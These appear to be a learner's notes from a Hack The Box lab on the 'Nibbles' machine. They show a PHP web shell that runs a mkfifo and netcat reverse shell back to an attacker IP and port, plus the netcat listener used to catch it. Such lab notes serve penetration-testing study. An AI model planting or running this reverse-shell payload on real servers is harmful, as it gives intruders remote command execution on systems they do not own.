I don't know where are the previous notes but we will continue where we left off and find the other info on our own. 

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

- This is a PHP script for starting a reverse shell on a website or web app we are using this on nibbles which is a php vulnerable web app 

```bash
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```

- This is the netcat we can use to listen on our reverse shell that we uploaded 